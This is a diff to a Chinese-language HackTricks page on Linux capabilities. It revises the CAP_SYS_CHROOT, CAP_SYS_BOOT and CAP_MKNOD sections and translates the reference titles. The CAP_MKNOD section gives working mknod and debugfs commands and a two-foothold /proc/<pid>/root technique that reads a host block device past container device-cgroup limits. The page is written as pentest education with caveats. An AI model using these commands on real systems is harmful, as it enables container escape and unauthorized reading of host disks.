+这是一个 **chroot-jail escape capability，而不是独立的 container-to-host escape**。它既不会暴露 host filesystem，也不会绕过其 permissions。如果 host root 已经被挂载，或可以通过 `/proc/<pid>/root` 访问，`chroot()` 只会将该现有 tree 设置为进程的 pathname root。另一方面，使用 `setns(2)` 更改 mount namespaces，需要调用者的 user namespace 中同时具备 `CAP_SYS_CHROOT` 和 `CAP_SYS_ADMIN`，并且拥有目标 mount namespace 的 user namespace 中也必须具备 `CAP_SYS_ADMIN`。<sup>[[14]](#references)</sup>
+
+- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
+- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行 `reboot(2)` system call 来重启系统，包括 `LINUX_REBOOT_CMD_RESTART2` 等命令；它还启用 `kexec_load(2)`，以及从 Linux 3.17 开始启用 `kexec_file_load(2)`，分别用于加载新的 crash kernel 或已签名的 crash kernel。<sup>[[14]](#references)</sup>
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行用于重启系统的 `reboot(2)` system call，包括 `LINUX_REBOOT_CMD_RESTART2` 等命令；它还启用 `kexec_load(2)`，以及从 Linux 3.17 开始启用 `kexec_file_load(2)`，分别用于加载新的 crash kernels 或已签名的 crash kernels。<sup>[[14]](#references)</sup>
 
+在 private PID namespace 内，受支持的 `reboot()` 请求会终止该 namespace 的 init process，而不是重启 host。因此，重启 host 需要位于 initial PID namespace 中，通常通过共享 host PID 实现。基于 kexec 的 takeover 还需要兼容的 image、可用的 syscall，以及宽松的 lockdown 和 signature policy。不要仅为验证该 capability 而在共享 host 上触发任一操作：
+```bash
+capsh --print | grep cap_sys_boot
+readlink /proc/self/ns/pid /proc/1/ns/pid
+command -v kexec 2>/dev/null
+cat /sys/kernel/security/lockdown 2>/dev/null
+```
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更宽泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` call 的能力。当 `kptr_restrict` 设置为 1 时，此 capability 可通过 `/proc` 及类似接口查看 kernel addresses；该设置用于控制 kernel addresses 的暴露程度。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，表示 kernel addresses 会被暴露，不过出于安全原因，许多 distributions 将其设置为 1（除 uid 0 外隐藏 addresses）或 2（始终隐藏 addresses）。<sup>[[14]](#references)</sup>
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 于 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` 调用的能力。当 `kptr_restrict` 设置为 1 时，此 capability 允许通过 `/proc` 及类似接口查看 kernel 地址；该设置控制 kernel 地址的暴露程度。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，这意味着 kernel 地址会被暴露，不过出于安全原因，许多发行版会将其设置为 1（除 uid 0 外隐藏地址）或 2（始终隐藏地址）。<sup>[[14]](#references)</sup>
 
-此外，当 `dmesg_restrict` 设置为 1 时，**CAP_SYSLOG** 允许访问 `dmesg` 输出。尽管发生了这些变化，由于历史原因，**CAP_SYS_ADMIN** 仍保留执行 `syslog` 操作的能力。<sup>[[14]](#references)</sup>
+此外，当 `dmesg_restrict` 设置为 1 时，**CAP_SYSLOG** 允许访问 `dmesg` 输出。尽管进行了这些更改，由于历史原因，**CAP_SYS_ADMIN** 仍保留执行 `syslog` 操作的能力。<sup>[[14]](#references)</sup>
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` system call 的功能，使其不仅能创建普通文件、FIFO（named pipes）或 UNIX domain sockets，还能创建 special files，具体包括：<sup>[[14]](#references)</sup>
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` system call 的功能，使其不仅能创建常规文件、FIFO（named pipes）或 UNIX domain sockets，还能创建特殊文件，具体包括：<sup>[[14]](#references)</sup>
 
-- **S_IFCHR**：Character special files，即 terminals 等设备。
-- **S_IFBLK**：Block special files，即 disks 等设备。
+- **S_IFCHR**：字符特殊文件，即终端等设备。
+- **S_IFBLK**：块特殊文件，即磁盘等设备。
 
-对于需要创建 device files（包括 character 或 block devices）的 processes，此 capability 很有用。<sup>[[14]](#references)</sup>
+对于需要创建设备文件（包括字符设备或块设备）的进程，此 capability 很有用。<sup>[[14]](#references)</sup>
 
-它包含在 Docker 文档所列出的默认 capability set 中；应验证实际的 runtime configuration，而不是假设每个 deployment 都使用相同的默认值（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>
+它包含在 Docker 文档所列出的默认 capability 集合中；应验证实际的 runtime 配置，而不要假设每个 deployment 都使用相同的默认值（[Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>
 
-在满足以下条件时，此 capability 允许在 host 上执行 privilege escalations（通过读取整个 disk）：<sup>[[7]](#references)</sup>
+对于 container escape，`CAP_MKNOD` 可以为真实 host device 创建缺失的 handle，但它**不会**创建底层 device，也**不会**绕过 device cgroup。完整链条需要：
 
-1. 已获得 host 的初始访问权限（Unprivileged）。
-2. 已获得 container 的初始访问权限（Privileged（EUID 0），且具有 effective `CAP_MKNOD`）。
-3. Host 和 container 应共享同一个 user namespace。
+1. 在 initial user namespace 中具有效的 `CAP_MKNOD`，因为 device creation 不受 namespace 隔离。
+2. 真实 host device 所对应的正确 block 或 character type 以及 major/minor numbers。
+3. device-cgroup 允许打开该 device。
+4. 兼容 filesystem 的 reader，或使用 `CAP_SYS_ADMIN` 挂载 block filesystem。
+5. filesystem 和 LSM 允许创建及使用该 node。
 
-**在 Container 中创建并访问 Block Device 的步骤：**
-
-1. **在 Host 上以 Standard User 身份：**
-
-- 使用 `id` 确定当前 user ID，例如 `uid=1000(standarduser)`。
-- 确定目标 device，例如 `/dev/sdb`。
-
-2. **在 Container 内以 `root` 身份：**
+对于一个真实 major/minor numbers 为 `252:1` 的 ext-family lab block device，只读验证方式为：
 ```bash
-# Create a block special file for the host device
-mknod /dev/sdb b 8 16
-# Set read and write permissions for the user and group
-chmod 660 /dev/sdb
-# Add the corresponding standard user present on the host
-useradd -u 1000 standarduser
-# Switch to the newly created user
-su standarduser
+mknod /dev/ht-node-root b 252 1
+ls -l /dev/ht-node-root
+debugfs -R 'cat /etc/hostname' /dev/ht-node-root
+rm /dev/ht-node-root
 ```
-3. **回到主机端：**
+将这些数字替换为 `/sys/class/block/<device>/dev` 报告的数字。如果创建节点成功，但打开它时返回 `Operation not permitted`，则 device cgroup 仍在阻止访问。这是在仅具有 Docker 默认 `CAP_MKNOD`、但未显式允许设备的容器中出现的正常结果。
+
+此外，还存在一种独立的**双 foothold 本地权限提升**技术，不应与直接访问 container device 混淆。共享初始 user namespace 的容器中的 root 进程可以创建 block-device node，而 host 上具有匹配 UID 的 unprivileged shell 则通过 `/proc/<container-pid>/root` 打开该节点。随后，open 操作会在 host shell 的 cgroup 中进行评估，因此 container 的 device-cgroup 拒绝不再能够保护该设备。<sup>[[7]](#references)</sup>
+
+在 container 内，创建该节点，并让一个进程以现有 host foothold 的 UID 运行：
 ```bash
-# Locate the PID of the container process owned by "standarduser"
-# This is an illustrative example; actual command might vary
-ps aux | grep -i container_name | grep -i standarduser
-# Assuming the found PID is 12345
-# Access the container's filesystem and the special block device
-head /proc/12345/root/dev/sdb
+host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
+mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
+chown "$host_uid" /dev/ht-node-root
+chmod 600 /dev/ht-node-root
+bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
+if [ -z "$bridge_user" ]; then
+useradd -u "$host_uid" -M htbridge
+bridge_user=htbridge
+fi
+su -s /bin/sh "$bridge_user" -c 'sleep 600'
 ```
-该方法允许标准用户通过容器访问并可能读取 `/dev/sdb` 中的数据，前提是设备、命名空间和权限按照所述方式进行配置。<sup>[[7]](#references)</sup>
+在具有该 UID 的现有 host shell 中，识别处于休眠状态的容器进程的 host PID，并将其 procfs 根目录用作设备路径：
+```bash
+container_pid=<host-pid-of-the-matching-uid-process>
+stat "/proc/${container_pid}/root/dev/ht-node-root"
+debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
+```
+此链要求同时满足以下条件：具备两个 foothold、identity-mapped 或 shared user namespace、拥有遍历目标 `/proc/<pid>/root` 的权限、存在 major/minor numbers 正确的真实设备，以及外层 cgroup 允许执行该 open。`hidepid`、ptrace-access rules、LSM、filesystem incompatibility 或 user-namespace remapping 都可能使其失效。该历史 technique 的价值恰恰在于说明 `/proc/<pid>/root` 如何绕过 *container* 的 device-cgroup restriction；它并不是说单独拥有 `CAP_MKNOD` 就能逃逸正常隔离的 container。<sup>[[7]](#references)</sup>
 
 ### CAP_SETPCAP
 
-在支持文件 capabilities 的当前 Linux 内核中，**`CAP_SETPCAP`** 允许线程将其 bounding set 中的 capabilities 添加到其 inheritable set 中，从其 bounding set 中删除 capabilities，以及更改其 securebits。它不允许进程任意向另一个进程授予 capabilities；该行为仅适用于不支持 file-capability、早于 2.6.25 的内核。<sup>[[14]](#references)</sup>
+在当前支持 file capabilities 的 Linux kernel 中，**`CAP_SETPCAP`** 允许 thread 将其 bounding set 中的 capabilities 添加到 inheritable set，从 bounding set 中删除 capabilities，并更改其 securebits。它不允许 process 任意向另一个 process 授予 capabilities；该行为仅适用于不支持 file-capability 的 2.6.25 之前的 kernel。<sup>[[14]](#references)</sup>
 
-`capset()` system call 可以调整线程自身的 effective、permitted 和 inheritable sets，但新的 permitted set 不能包含现有 permitted set 之外的 capabilities，且对 inheritable set 的更新仍受内核限制。<sup>[[14]](#references)</sup>
+`capset()` system call 可以调整 thread 自身的 effective、permitted 和 inheritable sets，但新的 permitted set 不能包含现有 permitted set 之外的 capabilities，且对 inheritable set 的更新仍受 kernel constraints 限制。<sup>[[14]](#references)</sup>
 
 ## References
 
 - [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
-- [2] [Hacker's Grimoire - Linux 权限提升](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
-- [3] [Linux 容器基础：Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
+- [2] [Hacker's Grimoire - Linux privilege escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
+- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
 - [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
-- [5] [利用 Linux Capabilities](https://www.linuxjournal.com/article/5737)
-- [6] [过度的 Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
-- [7] [滥用通过 /proc/pid/root 访问 mount namespaces 的权限](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
-- [8] [Linux Capabilities：它们为何存在以及如何工作](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
-- [9] [理解 Linux 中的 Capabilities](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
-- [10] [允许 ptrace 时绕过 seccomp 的 PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
-- [11] [如何突破各种 chroot 方案](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
-- [12] [shocker.c - Sebastian Krahmer 编写的原始 CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
-- [13] [Docker breakout exploit 分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
-- [14] [capabilities(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [15] [proc_pid_status(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
-- [16] [pam_cap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
-- [17] [capability.conf(5) - Ubuntu 手册页](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
-- [18] [systemd.exec(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
-- [19] [运行容器 - Docker 文档](https://docs.docker.com/engine/containers/run/)
-- [20] [docker container run - Docker 文档](https://docs.docker.com/reference/cli/docker/container/run)
-- [21] [cap_text_formats(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
-- [22] [getpcaps(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
-- [23] [getcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getcap.8.html)
+- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
+- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
+- [7] [Abusing access to mount namespaces through /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
+- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
+- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
+- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
+- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
+- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
+- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
+- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
+- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
+- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
+- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
+- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
+- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
+- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
+- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
+- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
 - [24] [amicontained](https://github.com/genuinetools/amicontained)
-- [25] [setcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/setcap.8.html)
-- [26] [capsh(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/capsh.1.html)
-- [27] [ioctl_iflags(2) - Linux 手册页](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
+- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
+- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
+- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
 {{#include ../../banners/hacktricks-training.md}}
